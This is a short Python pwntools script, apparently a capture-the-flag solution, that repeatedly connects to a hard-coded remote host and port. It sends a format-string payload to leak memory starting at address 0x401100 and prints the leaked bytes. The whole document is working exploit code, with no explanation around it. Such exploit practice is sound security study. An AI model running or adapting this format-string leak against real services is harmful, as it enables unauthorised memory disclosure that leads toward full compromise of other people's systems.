from pwn import *

def brute_leak():
    for i in range(0, 0x50, 8):
        io = remote("18.212.136.134", 1337)

        start_addr = 0x401100

        payload = b'%7$s'
        payload = payload.ljust(8, b'X')
        payload += flat(start_addr + i) 
        payload = payload.ljust(0x20, b'\x00')

        io.sendlineafter(b'say: ', payload)   

        io.recvuntil(b'Wow: ')

        try:
            leak = io.recvline(timeout=1).split(b'X' * 4)[0]

            print(f"[+] 0x{start_addr + i:x} => {leak}") 
            
        except:
            continue

        io.close()

brute_leak()